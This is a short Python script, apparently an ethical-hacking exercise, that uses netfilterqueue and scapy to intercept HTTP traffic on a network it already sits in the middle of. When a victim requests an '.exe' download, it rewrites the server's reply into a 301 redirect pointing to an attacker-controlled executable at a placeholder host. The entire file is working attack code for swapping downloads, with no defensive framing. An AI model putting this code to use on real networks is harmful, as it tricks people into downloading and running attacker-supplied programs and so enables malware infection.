import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import IP, TCP


target_file = '.exe'
fake_file = 'http://www.fake.location/file.exe'
ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):

        # dport = destination port, sport = source port
        if scapy_packet[TCP].dport == 80:

            if target_file in scapy_packet[scapy.Raw].load:

                # memorize the ack
                ack_list.append(scapy_packet[TCP].ack)
                print(f'[+] {target_file} file download request')

        elif scapy_packet[TCP].sport == 80:
            seq = scapy_packet[TCP].seq

            if seq in ack_list:
                ack_list.remove(seq)
                print('[+] Replace the file')
                modified_packet = set_load(scapy_packet, f'HTTP/1.1 301 Moved Permanently\nLocation: {fake_file}\n\n')
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
